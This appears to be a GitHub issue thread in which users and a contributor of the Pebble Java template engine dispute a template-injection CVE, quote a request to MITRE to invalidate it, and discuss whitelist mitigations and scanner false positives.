| This would include getters, collection methods but would disallow calling any bean’s or system methods.  Technically, how do you implement those categories?  A getter is only a convention. Is `getClass` or `getClassLoader` a getter? In Java, collections are not isolated, they sit in the `java.util` package, along with you also have things like `TimerThread`. You probably want to be able to do a substring on a String, or get its length. But in Java, all base types live in the `java.lang` package, where you also have things like `Thread`, `System` and `Runtime`.  It's actually very complicated.  In other words developers would rather have to push variables to the templates rather than pulling them from the template level by executing bean/system methods.  What about POJO trees or collections traversal: `foo.bar.baz`?  I consider calling bean methods from the template code a bad practice when you have the neat view model approach  What about static helpers, eg for formatting? This is a view concern so using those here is legit.  The CVE is not relevant to my application but it makes the Pebble library appear as an extreme risk in the security scan report.  In the end, a template is just a piece of the program. It doesn't look to me that Pebble is any less secure than Java itself. IMO, this CVE is not relevant. And neither is the previous one that resulted in introducing MethodAccessValidator.  If you agree to change the behavior of the default ‘MethodAccessValidator’ - I am willing to help.  Ha ha, there's a misunderstanding here :) I'm not a committer here, just a mere occasional contributor. I raised my voice in this ticket because we use Pebble in Gatling.  I'm willing to lend a hand but the owner here is [@ebussieres](https://github.com/ebussieres) and I absolutely don't have the bandwidth to become a core committer here. |

| FYI, I've requested the invalidation of the CVE. Here's the message I posted on the [MITRE form](https://cveform.mitre.org/):  ``` Hi,  I'm a contributor on the PebbleTemplate open-source project. Some time ago, a CVE against this library was created. The reporter is unknown and the PebbleTemplate authors and community were not consulted in the process, in particular to check that the CVE was valid.  The report is based on an issue on an external GitHub bug tracker (https://github.com/Y4tacker/Web-Security/issues/3) which is now private, resulting in the link in the CVE description now being broken. I've managed to retrieve its content and copy it here: https://github.com/PebbleTemplates/pebble/issues/625#issuecomment-1282138635.  We've discussed this CVE with other users of this library and we strongly disagree with it.  The Pebble templating engine is to be embedded in Java applications and developers can code in the templates what they could code directly in the Java part of their application, like with Java Server Pages (JSP). In this sense, Pebble is not less secure than Java itself. If some developers decide to implement a feature to let their application consume templates provided by the end users, it's their responsibility to properly sanitize user input, just like one would protect against SQL injection. It's not the responsibility of the library.  As a result, I humbly request that you invalidate this CVE.  Best regards,  Stéphane Landelle  ``` |

| Not a contributor, not even a major user, but I came across this in my normal Gradle buildscript upgrade where I noticed that, yet again, my HTTP framework was including something with a vulnerability.  I disagree with the CVE and CVSS. That being said, there is some inconsistency which could lead to a "security issue."  Templates, pebble or not, are arbitrary code. They should be highly sanitized. Any failure to do so is the applications fault. In fact, that is my major gripe with the CVSS: this is **NOT** a remote vulnerability.  That being said, this does seem to be a bypass to existing mechanism of security: the blacklist. I don't use Spring Boot so I may be wrong in this front. Additionally, I do recognize that ensuring the blacklist cannot be bypassed is practically, if not literally, impossible, but the library's dependencies should not expose this issue by default.  I would suggest allowing a whitelist to be selected (if possible in a backwards compatible manner) or at the very minimum sanitizing the library's dependencies for bypass vulnerabilities. This ensures that the blacklist feature works as the user may expect (minus the obvious oversights users *should* expect from a default blacklist.)  In the meantime, I am yet again going to ignore the big yellow highlighting and tell Snyk it needs to calm down. |

| Hi all. One of our dev/test pipelines is blocked by this CVE. Our specific use case is running Gradle Gatling for load tests. This has Pebble as a dependency. From the helpful comments here I am understanding this disputed CVE as  "If Pebble is configured to read a template (or classpath location?) from a location that is under control of a malicious actor, the malicious actor could introduce malicious code which would be executed"? Is that fair?  In which case isn't it the same as using an insecure writeable public repo, or hosting your templates on a public writeable S3 bucket? Am I missing something? Other than this kind of egregious failure of source code security, is there any way someone could use this CVE for an attack?  Also - is there any progress on the proposed mitigations (Whitelist mode)? |

It is exactly this.  is there any way someone could use this CVE for an attack?  None I can think of.  Also - is there any progress on the proposed mitigations (Whitelist mode)?  I don’t think so. And it's probably a huge undertaking (similar to the official SecurityManager that has been deprecated for removal).  I tried to reach out to the organization maintaining the CVE database to try to get this CVE reconsidered but they never bothered replying. IMO, you should tune your vulnerability scanning tool to make this CVE a false positive. |
